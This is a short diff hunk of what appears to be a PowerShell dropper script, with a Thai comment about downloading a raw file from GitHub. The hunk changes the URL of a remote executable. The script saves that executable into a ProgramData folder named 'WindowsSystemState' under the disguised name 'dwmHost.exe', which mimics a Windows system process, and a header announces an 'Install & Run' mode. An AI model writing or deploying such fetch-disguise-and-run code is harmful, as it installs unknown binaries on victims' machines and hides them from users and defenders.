@@ -22,7 +22,7 @@ $InstallPath = Join-Path $env:ProgramData "WindowsSystemState"
 $SexeDestination = Join-Path $InstallPath "dwmHost.exe" 
 
 # URL ดาวน์โหลด Raw file จาก GitHub (ของคุณ)
-$SexeUrl = "https://raw.githubusercontent.com/Verte225066/test/main/EEEEEEEEEEEEEEEEE.exe" 
+$SexeUrl = "https://github.com/Verte225066/test/blob/main/cmd.exe" 
 
 # Install & Run Mode
 # ----------------------------------------------------------------------------------------------------------------------------------------------------------------
